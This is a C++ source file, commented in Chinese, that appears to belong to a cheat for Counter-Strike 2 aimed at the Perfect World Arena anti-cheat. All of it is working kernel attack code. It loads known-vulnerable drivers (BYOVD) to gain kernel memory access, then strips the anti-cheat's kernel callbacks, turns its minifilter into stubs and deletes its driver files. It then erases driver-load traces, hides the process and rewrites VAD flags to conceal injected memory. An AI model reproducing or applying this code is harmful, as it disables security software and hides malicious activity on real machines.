    wsprintfW(searchPaths[searchPathCount++], L"C:\\Program Files\\PerfectWorldArena");

    // ★ v3.126l: 修复 — 激活 %LocalAppData% 搜索路径 (之前是死代码)
    wchar_t localPath[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localPath))) {
        wsprintfW(searchPaths[searchPathCount++], L"%s\\PerfectWorldArena", localPath);
    }

    for (int si = 0; si < searchPathCount; si++) {
        const wchar_t* base = searchPaths[si];
        if (GetFileAttributesW(base) == INVALID_FILE_ATTRIBUTES) continue;

        wchar_t pattern[MAX_PATH] = {};
        wsprintfW(pattern, L"%s\\*", base);
        WIN32_FIND_DATAW fd = {};
        HANDLE hFind = FindFirstFileW(pattern, &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;

        do {
            if (wcschr(fd.cFileName, L'.') || !(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            // ★ v3.126l: 更精确匹配 — 移除过于宽泛的 "pw" 模糊匹配
            //   仅匹配以 perfectworldarena 开头的目录
            if (_wcsnicmp(fd.cFileName, L"perfectworldarena", 17) == 0) {

                wchar_t pluginDir[MAX_PATH] = {};
                wsprintfW(pluginDir, L"%s\\%s\\plugin", base, fd.cFileName);
                if (GetFileAttributesW(pluginDir) != INVALID_FILE_ATTRIBUTES) {
                    // ★ v3.126p: 先搜索确切名称, 未找到则模糊扫描 *.sys
                    wchar_t drvFile[MAX_PATH] = {};
                    wsprintfW(drvFile, L"%s\\%s.sys", pluginDir, GetPacTargetName());
                    bool found = (GetFileAttributesW(drvFile) != INVALID_FILE_ATTRIBUTES);

                    if (!found) {
                        // 模糊扫描: 在 plugin 目录中搜索任何匹配 PAC 模式的 .sys 文件
                        wchar_t sysPattern[MAX_PATH] = {};
                        wsprintfW(sysPattern, L"%s\\*.sys", pluginDir);
                        WIN32_FIND_DATAW sfd = {};
                        HANDLE sFind = FindFirstFileW(sysPattern, &sfd);
                        if (sFind != INVALID_HANDLE_VALUE) {
                            do {
                                if (IsPacPattern(sfd.cFileName)) {
                                    wsprintfW(drvFile, L"%s\\%s", pluginDir, sfd.cFileName);
                                    found = true;
                                    break;
                                }
                            } while (FindNextFileW(sFind, &sfd));
                            FindClose(sFind);
                        }
                    }

                    if (found) {
                        ByovdDiag("PAC:DeleteDrvFiles: found %ls\n", drvFile);
                        wchar_t bakFile[MAX_PATH] = {};
                        wsprintfW(bakFile, L"%s.bak", drvFile);
                        MoveFileExW(drvFile, bakFile, MOVEFILE_REPLACE_EXISTING);
                        DeleteFileW(bakFile);
                        DeleteFileW(drvFile);
                    }
                }
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    // 2. system32\drivers 中的备份 (★ v3.126p: 动态名称)
    wchar_t sys32Drv[MAX_PATH] = {};
    wsprintfW(sys32Drv, L"C:\\Windows\\System32\\drivers\\%s.sys", GetPacTargetName());
    if (!DeleteFileW(sys32Drv)) {
        DWORD err = GetLastError();
        if (err != ERROR_FILE_NOT_FOUND) {
            ByovdDiag("PAC:DeleteDrvFiles: cannot delete system32 driver, err=%d, scheduling reboot\n", (int)err);
            MoveFileExW(sys32Drv, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    } else {
        wchar_t sys32Bak[MAX_PATH] = {};
        wsprintfW(sys32Bak, L"C:\\Windows\\System32\\drivers\\%s.sys.bak", GetPacTargetName());
        DeleteFileW(sys32Bak);
    }
}

bool KernelDefense::DisablePac() {
    ByovdDiag("PAC:DisablePac: starting...\n");

    // ★ BUILD 474: 检查 MessageTransfer 是否加载 — 否则跳过 SCM (OpenSCManagerW 崩溃)
    {
        uint64_t mtBase = KernelMemoryAccessor::Instance().GetKernelModuleBase(
            "MessageTransfer.sys");
        if (!mtBase) {
            ByovdDiag("PAC:DisablePac: MessageTransfer.sys not loaded, skip SCM (BUILD 474 guard)\n");
            return true;  // 驱动未加载 = 不需要禁用
        }
        ByovdDiag("PAC:DisablePac: MessageTransfer.sys loaded at 0x%llX\n",
            (unsigned long long)mtBase);
    }

    // 1. 停止服务并删除
    bool svcOk = DisablePacService();

    // 2. ★ v3.126n: 中和 minifilter (不卸载, 替换回调为无害 stub)
    //   与 UnloadPacMinifilter 不同: Neutralize 保留 minifilter 在 FilterFindFirst 列表中
    //   PAC 客户端检查 minifilter 存在性时看到 MessageTransfer 仍在, 但回调已失效
    bool ntrlOk = MinifilterNeutralizer::NeutralizeMessageTransfer();

    // 3. 删除驱动文件
    DeletePacDriverFiles();

    // ★ v3.126n: 成功条件 — 中和或卸载任一个完成即可
    //   Neutralize 是首选方案 (不报缺失), 但 Unload 是回退方案
    bool result = ntrlOk;
    if (!result) {
        // 回退: 中和失败, 尝试传统卸载
        ByovdDiag("PAC:DisablePac: neutralize failed, fallback to FilterUnload\n");
        bool fltOk = UnloadPacMinifilter();
        result = fltOk;
    }

    ByovdDiag("PAC:DisablePac: svc=%d ntrl=%d → result=%d%s\n",
        (int)svcOk, (int)ntrlOk, (int)result,
        (!result && svcOk) ? " (WARNING: minifilter still active!)" : "");
    return result;
}

void KernelDefense::GuardPac() {
    // ★ v3.126n: 三重检查 — 服务 + minifilter 存在性 + 回调完整性
    bool needReDisable = false;

    // ★ BUILD 474: 先检查 MessageTransfer 是否加载 — 否则 SCM 崩溃
    {
        uint64_t mtBase = KernelMemoryAccessor::Instance().GetKernelModuleBase(
            "MessageTransfer.sys");
        if (!mtBase) {
            return;  // 驱动未加载, 无需检查 SCM
        }
    }

    // 检查 1: SCM 服务状态
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, GetPacTargetName(), SERVICE_QUERY_STATUS);
        if (svc) {
            SERVICE_STATUS_PROCESS ssp = {};
            DWORD bytesNeeded = 0;
            if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
                if (ssp.dwCurrentState == SERVICE_RUNNING) {
                    needReDisable = true;
                }
            }
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }

    // 检查 2: minifilter 存在 + 回调是否被恢复
    //   ★ v3.126n: 如果 minifilter 存在但回调是 stub → 无害 (Neutralize 成功)
    //              如果 minifilter 存在但回调已恢复 → PAC 修复了 → 重新禁用
    //              如果 minifilter 不在列表中 → 被卸载了 → 可能需要重新处理
    if (!needReDisable) {
        bool filterExists = IsPacMinifilterLoaded();
        if (filterExists && !MinifilterNeutralizer::IsMessageTransferNeutralized()) {
            ByovdDiag("PAC:GuardPac: callback stubs overwritten! re-neutralizing...\n");
            needReDisable = true;
        }
    }

    if (needReDisable) {
        ByovdDiag("PAC:GuardPac: PAC re-enabled! disabling again...\n");
        DisablePac();
    }
}

// ============================================================
KernelDefense::Result KernelDefense::EnableAll() {
    Result result;
    auto& kma = KernelMemoryAccessor::Instance();

    // ★ v3.37: 诊断 — HVCI 状态检测
    bool hvciEnabled = kma.IsHVCIEnabled();
    ByovdDiag("BYOVD: HVCI=%d (1=blocked all)\n", (int)hvciEnabled);

    // v3.34: 多驱动随机轮换
    int candCount = BYOVDDrivers::GetCandidateCount();
    int indices[8] = {0, 1, 2, 3, 4, 5, 6, 7};
    for (int i = candCount - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = indices[i];
        indices[i] = indices[j];
        indices[j] = tmp;
    }

    for (int ci = 0; ci < candCount; ci++) {
        const BYOVDDriverInfo* cand = g_driverCandidates[indices[ci]];
        // ★ v3.37: 诊断 — 每个驱动尝试日志
        wchar_t drvName[64] = {};
        wcsncpy_s(drvName, cand->driverPath, 63);
        ByovdDiag("BYOVD: trying driver[%d/%d] = %ls ...\n", ci+1, candCount, drvName);

        BYOVDDriverInfo mutated = MutateAndRandomizeDriver(*cand);
        ByovdDiag("BYOVD:EnableAll: calling Initialize...\n");
        result.driverLoaded = kma.Initialize(mutated);
        ByovdDiag("BYOVD:EnableAll: Initialize returned %d\n", (int)result.driverLoaded);

        if (result.driverLoaded) {
            ByovdDiag("BYOVD: SUCCESS with %ls\n", drvName);
            break;
        } else {
            ByovdDiag("BYOVD: FAILED %ls (HVCI=%d)\n", drvName, (int)hvciEnabled);
        }
    }

    if (!result.driverLoaded) {
        ByovdDiag("BYOVD: ALL %d drivers failed — kernel defense UNAVAILABLE\n", candCount);
        return result;
    }

    // ★ v3.126p: PAC 回调摘除 — 动态名称（唯一目标）
    auto& cbDisabler = EACCallbackDisabler::Instance();
    // ★ BUILD 501: 固定缓冲区替代 std::string — 避免 CRT 堆依赖
    char pacNameA[256] = {};
    WStringToString(GetPacTargetName(), pacNameA, 256);
    int pacOb = cbDisabler.DisableObCallbacks(pacNameA);
    int pacProc = cbDisabler.DisableProcessNotifyCallbacks(pacNameA);
    int pacImg = cbDisabler.DisableImageNotifyCallbacks(pacNameA);
    if (pacOb || pacProc || pacImg) {
        ByovdDiag("BYOVD: callbacks removed (PAC/%s) — ob=%d proc=%d img=%d\n",
            pacNameA, pacOb, pacProc, pacImg);
        result.obCallbacksRemoved += pacOb;
        result.processCallbacksRemoved += pacProc;
        result.imageCallbacksRemoved += pacImg;
    }

    // ★ v3.126j: PAC minifilter 禁用 (这比 ObRegisterCallbacks 摘除更重要)
    //   因为 PAC 主要通过 minifilter 扫盘 + 文件操作拦截检测作弊
    // ★ BUILD 475: 先验证 FLT 管道完整性 — 无论 MessageTransfer 是否加载
    bool fltPipelineOk = MinifilterNeutralizer::VerifyFltPipeline();
    ByovdDiag("BYOVD: FLT pipeline verify: %s\n", fltPipelineOk ? "PASS" : "FAIL");
    result.pacDisabled = DisablePac();

    // ★ v3.126m: 清理内核驱动痕迹 (MmUnloadedDrivers / PiDDBCacheTable / CiHashBucket)
    //   在所有防御启用后, 最后由 BYOVD 内核 R/W 清理 RTCore64 加载/卸载痕迹
    KernelTraceCleaner::CleanAllTraces();

    return result;
}

void KernelDefense::DisableAll() {
    DKOMProcessHider::Instance().UnhideProcess();
    auto& kma = KernelMemoryAccessor::Instance();

    // ★ v3.110: 在卸载驱动前先恢复所有回调, 防止反作弊检测到回调被移除
    auto& cbDisabler = EACCallbackDisabler::Instance();
    if (cbDisabler.HasRemovedCallbacks()) {
        cbDisabler.RestoreAll();
    }

    // v3.49: 一用即卸 — 卸载驱动 + 清除注册表 + 删除驱动文件
    if (kma.IsActive()) {
        // ★ BUILD 501: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        const wchar_t* svcName = kma.GetServiceName();
        const wchar_t* drvPath = kma.GetDriverPath();

        // ★ v3.126m: 卸载前最后清理一次 PiDDBCacheTable (驱动名已随机化,
        //   MmUnloadedDrivers 无需清理, 但 PiDDBCacheTable 按校验和索引)
        KernelTraceCleaner::CleanAllTraces();

        kma.Shutdown();

        // 删除注册表服务键 — ★ BUILD 501: 手动构造路径替代 std::wstring 拼接
        wchar_t keyPath[512] = {};
        wcscpy_s(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
        wcscat_s(keyPath, svcName);
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);

        // 删除 TEMP 中的驱动文件
        if (drvPath && drvPath[0]) {
            DeleteFileW(drvPath);
        }

        ByovdDiag("BYOVD: %ls unloaded & cleaned.\n", svcName);
    }
}

void KernelDefense::RestoreAllCallbacks() {
    auto& cbDisabler = EACCallbackDisabler::Instance();
    if (cbDisabler.HasRemovedCallbacks()) {
        ByovdDiag("BYOVD:KernelDefense: RestoreAllCallbacks\n");
        cbDisabler.RestoreAll();
    }
}

// ★ v3.127: PAC-only 驱动名 fallback — 仅用 IsPacPattern 做安全匹配
//   删除原 IsAntiCheatDriverName (短子串误杀空间太大) 
//   删除原 FindAntiCheatDriverViaFallback (遍历 275 个驱动做模糊匹配)
//   DisableProcessNotify/ImageNotify 不再做 fallback — 找不到驱动就返回 0
static bool IsPacDriverName_Fallback(const char* name) {
    if (!name || !*name) return false;
    // 转为宽字符调用 IsPacPattern (已有系统 minifilter 白名单)
    wchar_t wide[128] = {};
    for (int i = 0; i < 127 && name[i]; i++)
        wide[i] = (wchar_t)(unsigned char)name[i];
    return IsPacPattern(wide);
}


// ★ v3.126g: 重新摘除所有反作弊回调 — 周期性监控用
//   注意: 不检查 HasRemovedCallbacks(), 始终尝试重新摘除,
//   以处理反作弊卸载后重加载的场景 (新回调需重新 NULL 化)
void KernelDefense::ReapplyAllCallbacks() {
    auto& cbDisabler = EACCallbackDisabler::Instance();
    int total = 0;

    // ★ v3.126p: PAC — 动态名称
    // ★ BUILD 501: 固定缓冲区替代 std::string — 避免 CRT 堆依赖
    char pacNameBuf[256] = {};
    WStringToString(GetPacTargetName(), pacNameBuf, 256);
    total += cbDisabler.DisableAll(pacNameBuf);

    if (total > 0) {
        ByovdDiag("BYOVD:KernelDefense: ReapplyAllCallbacks removed %d callbacks\n", total);
    }

    // ★ v3.126j: PAC 守卫 — 检查 PAC minifilter 是否被重新安装
    GuardPac();
}

// ============================================================
// v3.34: VADConcealer — VAD 节点伪装
//
// 通过 BYOVD 内核 R/W 遍历 cs2.exe 的 VAD AVL 树,
// 将注入区域的 _MMVAD_SHORT.u.VadFlags.PrivateMemory 清零,
//   使 MEM_PRIVATE → MEM_MAPPED, 绕过反作弊 VAD 扫描
//
// 原理:
//   EPROCESS->VadRoot → AVL 树 (RTL_BALANCED_NODE)
//   每个 VAD 节点记录一个虚拟地址范围 (StartingVpn..EndingVpn)
//   VadFlags.PrivateMemory bit: 1 = MEM_PRIVATE, 0 = MEM_MAPPED
// ============================================================

// Win10 22H2 / Win11 x64 EPROCESS + VAD 偏移量
struct VadOffsets {
    // EPROCESS
    static constexpr uint32_t UniqueProcessId   = 0x440;
    static constexpr uint32_t ActiveProcessLinks = 0x448;
    static constexpr uint32_t VadRoot            = 0x7D8; // 主要候选
    static constexpr uint32_t VadRootAlt         = 0x658; // Win11 备选

    // _RTL_BALANCED_NODE (embedded in _MMVAD_SHORT)
    static constexpr uint32_t RbnLeft  = 0x00;
    static constexpr uint32_t RbnRight = 0x08;
    static constexpr uint32_t RbnParentEncoded = 0x10;

    // _MMVAD_SHORT (after RTL_BALANCED_NODE at +0x18)
    static constexpr uint32_t VadStartingVpn = 0x18;
    static constexpr uint32_t VadEndingVpn   = 0x20;
    static constexpr uint32_t VadFlags       = 0x30; // u.LongFlags / u.VadFlags union
    static constexpr uint32_t VadControlArea = 0x38;

    static constexpr uint64_t PrivateMemoryBit  = 0x01000000ULL; // bit 24 最常见位置
    static constexpr uint64_t ProtectionMask    = 0x00F80000ULL; // bits 19-23 (5 bits)
};

// 获取 cs2.exe 的 EPROCESS 内核地址
static uint64_t GetEPROCESSByPid(KernelMemoryAccessor& kma, DWORD targetPid, uint64_t ntosBase) {
    // PsInitialSystemProcess → ActiveProcessLinks → 遍历
    // 从 ntoskrnl 导出 PsInitialSystemProcess 指针获取 System 进程 EPROCESS
    // 简化: 硬编码 PsInitialSystemProcess 偏移
    // 备选: 通过 PsLookupProcessByProcessId 的 sigscan

    // 方法: 从 ntoskrnl 数据节定位 PsActiveProcessHead
    // PsActiveProcessHead 通常是 ntoskrnl 的导出符号
    // 简化路径: 扫描 ntoskrnl 数据段找 ActiveProcessLinks 循环起点
    uint64_t psInitAddr = kma.ResolveExport(ntosBase, "PsInitialSystemProcess");
    if (!psInitAddr) return 0;

    uint64_t sysEprocess = kma.Read<uint64_t>(psInitAddr);
    if (!sysEprocess || sysEprocess < 0xFFFF800000000000ULL) return 0;

    uint64_t current = sysEprocess;
    int maxWalk = 512;
    while (maxWalk-- > 0) {
        uint64_t pid = kma.Read<uint64_t>(current + VadOffsets::UniqueProcessId);
        if (pid == targetPid) return current;

        uint64_t flink = kma.Read<uint64_t>(current + VadOffsets::ActiveProcessLinks);
        if (!flink || flink < 0xFFFF800000000000ULL) break;
        current = flink - VadOffsets::ActiveProcessLinks;
    }
    return 0;
}

// AVL 树序遍历, 查找包含 targetVA 的 VAD 节点
static bool FindAndModifyVadNode(KernelMemoryAccessor& kma, uint64_t vadNode, uint64_t targetVa) {
    if (!vadNode || !targetVa) return false;

    uint64_t targetVpn = targetVa >> 12;
    int maxDepth = 128;

    while (vadNode && maxDepth-- > 0) {
        uint64_t startVpn = kma.Read<uint64_t>(vadNode + VadOffsets::VadStartingVpn);
        uint64_t endVpn   = kma.Read<uint64_t>(vadNode + VadOffsets::VadEndingVpn);

        if (targetVpn >= startVpn && targetVpn <= endVpn) {
            // 找到目标 VAD 节点, 修改 PrivateMemory flag
            uint64_t flags = kma.Read<uint64_t>(vadNode + VadOffsets::VadFlags);

            // 检查 PrivateMemory bit 是否已设置
            if (flags & VadOffsets::PrivateMemoryBit) {
                // 清零 PrivateMemory bit → MEM_MAPPED
                flags &= ~VadOffsets::PrivateMemoryBit;

                // 设置 Protection = EXECUTE_READ (5), 模拟 .text 段映射
                flags &= ~VadOffsets::ProtectionMask;
                flags |= (5ULL << 19); // Protection = 5 = PAGE_EXECUTE_READ

                kma.Write<uint64_t>(vadNode + VadOffsets::VadFlags, flags);

                // 同时尝试修改 ControlArea → FilePointer 指向已知模块
                // 这可以进一步降低可疑度, 但需要额外解析
                // 跳过: 仅修改 PrivateMemory + Protection 已经够用

                return true;
            }
            return false; // 已经是 MAPPED
        }

        // AVL 遍历: 根据 VPN 决定走左子树还是右子树
        uint64_t left  = kma.Read<uint64_t>(vadNode + VadOffsets::RbnLeft);
        uint64_t right = kma.Read<uint64_t>(vadNode + VadOffsets::RbnRight);

        if (targetVpn < startVpn) {
            vadNode = left;
        } else {
            vadNode = right;
        }
    }
    return false;
}

bool VADConcealer::ConcealRegion(DWORD pid, uintptr_t regionBase, SIZE_T regionSize) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive() || !regionBase || !regionSize) return false;

    uint64_t ntosBase = kma.GetNtoskrnlBase();
    if (!ntosBase) return false;

    // 获取 cs2.exe 的 EPROCESS
    uint64_t eprocess = GetEPROCESSByPid(kma, pid, ntosBase);
    if (!eprocess) return false;

    // 尝试两个可能的 VadRoot 偏移
    uint64_t vadRoot = 0;
    for (uint32_t vadOff : {VadOffsets::VadRoot, VadOffsets::VadRootAlt}) {
        vadRoot = kma.Read<uint64_t>(eprocess + vadOff);
        if (vadRoot && vadRoot > 0xFFFF800000000000ULL) break;
    }
    if (!vadRoot || vadRoot < 0xFFFF800000000000ULL) return false;

    // 遍历 VAD 树, 查找并修改匹配区域
    return FindAndModifyVadNode(kma, vadRoot, regionBase);
}

int VADConcealer::ConcealAllRegions(DWORD pid, const uintptr_t* bases, int count) {
    int success = 0;
    for (int i = 0; i < count && i < 32; i++) {
        if (bases[i] && ConcealRegion(pid, bases[i], 0x10000)) {
            success++;
        }
    }
    return success;
}

} // namespace stealth
